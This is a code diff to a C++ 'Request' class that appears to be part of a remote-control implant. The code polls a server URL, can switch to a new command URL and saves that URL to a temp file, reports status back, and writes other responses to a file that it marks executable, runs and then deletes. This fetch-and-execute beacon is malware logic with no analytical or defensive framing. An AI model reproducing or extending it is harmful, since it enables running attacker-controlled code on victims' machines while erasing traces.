@@ -1,18 +1,14 @@
 #include "../../include/target.hpp"
 #include <iostream>
 #include <fstream>
-#include <cstdio>
 #include <string>
 #include <regex>
 #include <unistd.h>
-#include <curl/curl.h>
-#include <sys/stat.h>
 
 using namespace std;
 Request::Request()
 {
     this->SetDistPath();
-    this->srcPath =  "/tmp/rest";
     this->duration = 2;
 }
 
@@ -40,9 +36,9 @@ int Request::HandleExecute()
     return 0;
 }
 
-void Request::WriteResponse(string readBuffer)
+void Request::WriteFile(const char* path, string readBuffer)
 {
-    ofstream file (this->srcPath, ios::out);
+    ofstream file (path, ios::out);
     file << readBuffer;
     file.close();
 }
@@ -69,7 +65,12 @@ int Request::Send()
             if (data == "") 
             {
                 this->url = oldUrl;
-                this->SendData(this->ERROR + "01" + "new url have empty response");
+                this->SendData(this->ERROR + " [01] " + "new url have empty response");
+            }
+            else
+            {
+                this->SendData(this->EVENT + " [01] " + "new url saved");
+                this->WriteFile(this->tmpPath, this->url);
             }
         }
         else if (regex_match(readBuffer, reDu))
@@ -83,7 +84,7 @@ int Request::Send()
     }
     else
     {
-        this->WriteResponse(readBuffer);
+        this->WriteFile(this->srcPath.c_str(), readBuffer);
         this->ChangePerms();
         this->HandleExecute();
         remove(this->srcPath.c_str());
